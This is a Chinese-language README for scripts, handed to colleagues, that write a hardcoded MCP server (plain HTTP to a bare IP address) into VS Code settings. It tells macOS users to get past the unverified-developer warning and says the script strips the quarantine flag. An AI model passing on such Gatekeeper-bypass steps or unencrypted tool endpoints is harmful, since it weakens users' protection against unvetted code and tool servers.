# VS Code MCP 一键安装包

## 你将得到什么
- 自动写入 MCP server 配置到用户 settings.json
- 自动生成/更新 VS Code 的 mcp.json
- 默认备份原 settings.json
- Windows 和 macOS 都有单文件脚本
- 可重复执行；配置相同则不会重复改写
- Windows 版兼容较老的 PowerShell 参数集

## 文件说明
- `mcp_setting.bat`：Windows 单文件脚本
- `mcp_setting.command`：macOS 单文件脚本

## 使用步骤（给同事）

**Windows**
1. 发送 `mcp_setting.bat`，对方双击运行
2. 重启 VS Code

**macOS**
1. 发送 `mcp_setting.command`
2. 对方先在终端赋权（只需一次）：
   ```bash
   chmod +x ~/Downloads/mcp_setting.command
   ```
3. 双击 `mcp_setting.command` 运行
4. 重启 VS Code

> macOS 若弹出"无法验证开发者"弹窗：不要点「移入废纸篓」，改为**右键 → 打开 → 打开**，只需第一次。脚本内部也会自动尝试去除隔离标记。

## 当前内置配置
```json
{
	"mcp": {
		"servers": {
			"97c39a7ad2384fbdb063a9dcc40ee6ea": {
				"url": "http://8.147.57.160:15000/mcp",
				"type": "http"
			}
		},
		"inputs": []
	}
}
```

## 说明
- 两个脚本内都已写死以下配置：
```json
{
	"servers": {
		"97c39a7ad2384fbdb063a9dcc40ee6ea": {
			"url": "http://8.147.57.160:15000/mcp",
			"type": "http"
		}
	},
	"inputs": []
}
```

- 可反复执行；如果当前 mcp 配置已经一致，脚本会直接提示无需修改
- 只覆盖 settings.json 里的 mcp 节点，不会清空其他 VS Code 设置
- macOS 脚本如果首次无法双击执行，先运行 `chmod +x mcp_setting.command`

## 安全建议
- 不要把长期明文 token 写入配置文件
- 建议通过 SSO、短期令牌或设备身份体系获取凭据
- 内网 HTTPS 请确保企业 CA 已下发

- 脚本默认会备份现有 settings.json
- Windows 默认写入 `%APPDATA%\Code\User\settings.json`
- macOS 默认优先写入 `~/Library/Application Support/Code/User/settings.json`，若仅安装 Insiders 则写入 `Code - Insiders`
- 如果 settings.json 含 JSON 注释导致解析失败，请先清理注释再执行
